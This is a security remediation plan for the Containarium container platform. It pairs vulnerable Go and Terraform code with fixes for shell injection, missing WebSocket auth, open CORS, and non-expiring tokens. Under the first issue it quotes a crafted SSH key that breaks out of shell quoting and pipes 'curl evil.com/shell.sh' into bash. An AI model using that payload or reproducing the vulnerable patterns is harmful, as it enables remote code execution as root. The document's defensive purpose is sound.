# Security Remediation Plan

This document outlines the security vulnerabilities identified in the Containarium codebase and the fixes applied.

## Status: ALL ISSUES FIXED

| Issue | Severity | Status |
|-------|----------|--------|
| Shell injection via SSH key content | HIGH | FIXED |
| Shell injection in sudoers setup | HIGH | FIXED |
| WebSocket terminal missing auth | HIGH | FIXED |
| CORS allows all origins | HIGH | FIXED |
| Non-expiring JWT tokens | MEDIUM | FIXED |
| Hardcoded developer path | MEDIUM | FIXED |
| Hardcoded Terraform key path | MEDIUM | FIXED |
| Install script without checksum | MEDIUM | FIXED |

---

## HIGH Priority - Exploitable Now

### 1. Shell Injection via SSH Key Content

**Location:** `internal/container/manager.go:322`

**Vulnerable Code:**
```go
cmd := fmt.Sprintf("echo '%s' >> %s", key, authorizedKeysPath)
if err := m.incus.Exec(containerName, []string{"bash", "-c", cmd}); err != nil {
```

**Attack Vector:**
A crafted SSH key like:
```
ssh-ed25519 AAAA' && curl evil.com/shell.sh | bash && echo '
```
breaks out of single quotes and executes arbitrary commands as root inside the container.

**Fix:**
Use the Incus file push API (`WriteFile`) instead of bash string interpolation:

```go
// Build authorized_keys content
var keysContent strings.Builder
for _, key := range sshKeys {
    key = strings.TrimSpace(key)
    if key == "" {
        continue
    }
    keysContent.WriteString(key)
    keysContent.WriteString("\n")
}

// Use Incus file push API (no shell involved)
if err := m.incus.WriteFile(containerName, authorizedKeysPath, []byte(keysContent.String()), "0600"); err != nil {
    return fmt.Errorf("failed to write authorized_keys: %w", err)
}
```

**Files to modify:**
- `internal/container/manager.go` - Replace `addSSHKeys` function

---

### 2. Shell Injection in Sudoers Setup

**Location:** `internal/container/manager.go:281`

**Vulnerable Code:**
```go
sudoersLine := fmt.Sprintf("%s ALL=(ALL) NOPASSWD:ALL", username)
if err := m.incus.Exec(containerName, []string{
    "bash", "-c",
    fmt.Sprintf("echo '%s' > /etc/sudoers.d/%s", sudoersLine, username),
}); err != nil {
```

**Risk Level:** Currently mitigated by username validator (`^[a-z0-9-]+$`), but the pattern is fragile. One validator change could re-expose it.

**Fix:**
Use the Incus file push API:

```go
sudoersLine := fmt.Sprintf("%s ALL=(ALL) NOPASSWD:ALL\n", username)
sudoersPath := fmt.Sprintf("/etc/sudoers.d/%s", username)

// Use Incus file push API
if err := m.incus.WriteFile(containerName, sudoersPath, []byte(sudoersLine), "0440"); err != nil {
    return fmt.Errorf("failed to configure sudo: %w", err)
}
```

**Files to modify:**
- `internal/container/manager.go` - Replace sudoers setup in `createUser` function

---

### 3. WebSocket Terminal Missing Authentication Enforcement

**Location:** `internal/gateway/gateway.go:142-157`

**Vulnerable Code:**
```go
token := r.URL.Query().Get("token")
if token == "" {
    // Try Authorization header as fallback
    authHeader := r.Header.Get("Authorization")
    if strings.HasPrefix(authHeader, "Bearer ") {
        token = strings.TrimPrefix(authHeader, "Bearer ")
    }
}
if token != "" {  // <-- BUG: Only validates IF token is present
    _, err := gs.authMiddleware.ValidateToken(token)
    if err != nil {
        http.Error(w, "Unauthorized", http.StatusUnauthorized)
        return
    }
}
gs.terminalHandler.HandleTerminal(w, r)  // <-- Proceeds without auth if no token
```

**Attack Vector:**
Unauthenticated users can open shell sessions to containers by simply not providing a token.

**Fix:**
Make authentication mandatory:

```go
token := r.URL.Query().Get("token")
if token == "" {
    // Try Authorization header as fallback
    authHeader := r.Header.Get("Authorization")
    if strings.HasPrefix(authHeader, "Bearer ") {
        token = strings.TrimPrefix(authHeader, "Bearer ")
    }
}

// MANDATORY: Require valid token
if token == "" {
    http.Error(w, "Unauthorized: token required", http.StatusUnauthorized)
    return
}

_, err := gs.authMiddleware.ValidateToken(token)
if err != nil {
    http.Error(w, "Unauthorized: invalid token", http.StatusUnauthorized)
    return
}

gs.terminalHandler.HandleTerminal(w, r)
```

**Files to modify:**
- `internal/gateway/gateway.go` - Fix terminal authentication handler

---

### 4. CORS Allows All Origins + WebSocket Origin Always Passes

**Locations:**
- `internal/gateway/gateway.go:117-121` (CORS)
- `internal/gateway/terminal.go:33-35` (WebSocket)

**Vulnerable Code:**

`gateway.go`:
```go
corsHandler := cors.New(cors.Options{
    AllowedOrigins: []string{
        "http://localhost:3000",
        "http://localhost",
        "*",  // <-- Allows any origin
    },
```

`terminal.go`:
```go
upgrader: websocket.Upgrader{
    CheckOrigin: func(r *http.Request) bool {
        return true  // <-- Always allows
    },
```

**Attack Vector:**
Any webpage on the internet can open a WebSocket terminal session to any container. Combined with issue #3 (no auth enforcement), this is a critical vulnerability.

**Fix:**

1. Make CORS configurable via environment variable:

```go
func getAllowedOrigins() []string {
    envOrigins := os.Getenv("CONTAINARIUM_ALLOWED_ORIGINS")
    if envOrigins != "" {
        return strings.Split(envOrigins, ",")
    }
    // Default to localhost only
    return []string{
        "http://localhost:3000",
        "http://localhost:8080",
        "http://localhost",
    }
}
```

2. Validate WebSocket origins properly:

```go
upgrader: websocket.Upgrader{
    CheckOrigin: func(r *http.Request) bool {
        origin := r.Header.Get("Origin")
        if origin == "" {
            return false  // Reject requests without Origin
        }
        allowedOrigins := getAllowedOrigins()
        for _, allowed := range allowedOrigins {
            if origin == allowed {
                return true
            }
        }
        return false
    },
```

**Files to modify:**
- `internal/gateway/gateway.go` - Add configurable CORS
- `internal/gateway/terminal.go` - Add origin validation

---

## MEDIUM Priority - Design Concerns

### 5. Non-Expiring JWT Tokens Allowed

**Location:** `internal/auth/token.go:46-48`

**Vulnerable Code:**
```go
// Handle non-expiring tokens
if expiresIn == 0 {
    claims.ExpiresAt = nil
}
```

**Risk:** `--expiry 0` creates tokens that live forever with no rotation mechanism.

**Fix:**

1. Set a maximum token expiry (e.g., 30 days):

```go
const MaxTokenExpiry = 30 * 24 * time.Hour  // 30 days

func (tm *TokenManager) GenerateToken(username string, roles []string, expiresIn time.Duration) (string, error) {
    // Enforce maximum expiry
    if expiresIn == 0 || expiresIn > MaxTokenExpiry {
        expiresIn = MaxTokenExpiry
    }

    claims := Claims{
        Username: username,
        Roles:    roles,
        RegisteredClaims: jwt.RegisteredClaims{
            ExpiresAt: jwt.NewNumericDate(time.Now().Add(expiresIn)),
            IssuedAt:  jwt.NewNumericDate(time.Now()),
            NotBefore: jwt.NewNumericDate(time.Now()),
            Issuer:    tm.issuer,
        },
    }
    // ... rest of function
}
```

2. Add a `--max-expiry` flag to the CLI for configurable maximum.

**Files to modify:**
- `internal/auth/token.go` - Add max expiry enforcement
- CLI command files for token generation

---

### 6. Hardcoded Developer Username in Fallback Path

**Location:** `internal/container/manager.go:418`

**Vulnerable Code:**
```go
homeDirectories := []string{
    os.Getenv("HOME"),
    "/home/hsinhoyeh", // <-- Hardcoded developer path
    "/home/ubuntu",
    "/home/admin",
    "/root",
}
```

**Risk:** Information leak + dead code that won't work for other users.

**Fix:**
Remove the hardcoded path:

```go
homeDirectories := []string{
    os.Getenv("HOME"),
    "/home/ubuntu",    // Common on Ubuntu systems
    "/home/admin",     // Common admin user
    "/root",           // Fallback to root
}
```

**Files to modify:**
- `internal/container/manager.go` - Remove hardcoded path

---

### 7. Hardcoded Private Key Path in Terraform

**Location:** `terraform/gce/main.tf:149`

**Vulnerable Code:**
```hcl
connection {
    type        = "ssh"
    user        = keys(var.admin_ssh_keys)[0]
    host        = google_compute_address.jump_server_ip.address
    private_key = file("/Users/hsinhoyeh/.ssh/containerium_ed25519")
}
```

**Risk:** Will break for anyone else and leaks developer's username.

**Fix:**

1. Add a variable for the private key path in `variables.tf`:

```hcl
variable "ssh_private_key_path" {
  description = "Path to SSH private key for provisioner connections"
  type        = string
  default     = ""  # If empty, skip the provisioner
}
```

2. Use the variable in `main.tf`:

```hcl
connection {
    type        = "ssh"
    user        = keys(var.admin_ssh_keys)[0]
    host        = google_compute_address.jump_server_ip.address
    private_key = file(var.ssh_private_key_path)
}
```

3. Add a condition to skip the provisioner if no key is provided.

**Files to modify:**
- `terraform/gce/main.tf` - Use variable for private key path
- `terraform/gce/variables.tf` - Add variable definition

---

### 8. Curl-Pipe-Bash Install Without Verification

**Risk:** No checksum or signature verification on the downloaded binary.

**Fix:**

1. Generate checksums during release:

```bash
# In release process
sha256sum containarium-linux-amd64 > containarium-linux-amd64.sha256
```

2. Update install script to verify checksum:

```bash
#!/bin/bash
BINARY_URL="https://github.com/footprintai/containarium/releases/latest/download/containarium-linux-amd64"
CHECKSUM_URL="https://github.com/footprintai/containarium/releases/latest/download/containarium-linux-amd64.sha256"

# Download binary and checksum
curl -fsSL -o /tmp/containarium "$BINARY_URL"
curl -fsSL -o /tmp/containarium.sha256 "$CHECKSUM_URL"

# Verify checksum
cd /tmp
if ! sha256sum -c containarium.sha256; then
    echo "ERROR: Checksum verification failed!"
    exit 1
fi

# Install
sudo mv /tmp/containarium /usr/local/bin/
sudo chmod +x /usr/local/bin/containarium
```

**Files to modify:**
- `scripts/install-mcp.sh` (or main install script) - Add checksum verification
- Release process/CI - Generate checksums

---

## Implementation Order

1. **Critical (fix immediately):**
   - Issue #3: WebSocket terminal auth (easy fix, high impact)
   - Issue #4: CORS/WebSocket origin validation

2. **High (fix this week):**
   - Issue #1: SSH key shell injection
   - Issue #2: Sudoers shell injection

3. **Medium (fix soon):**
   - Issue #5: JWT token expiry
   - Issue #6: Hardcoded developer path
   - Issue #7: Terraform hardcoded key path

4. **Low (next release):**
   - Issue #8: Install script checksum verification

---

## Testing Plan

After implementing fixes:

1. **Shell injection tests:**
   - Create container with malicious SSH key content
   - Verify command injection is blocked
   - Test with various shell escape sequences

2. **Authentication tests:**
   - Attempt WebSocket connection without token
   - Verify rejection
   - Test with invalid tokens
   - Test with expired tokens

3. **CORS tests:**
   - Test requests from unauthorized origins
   - Verify WebSocket origin validation

4. **Token expiry tests:**
   - Attempt to create non-expiring token
   - Verify maximum expiry is enforced

---

## Notes

- The Incus client already has `WriteFile` method (`internal/incus/client.go:949-973`) that can be used to fix shell injection issues
- The username validator in `jump_server.go:109-130` (`isValidUsername`) is solid and can be referenced for additional input validation
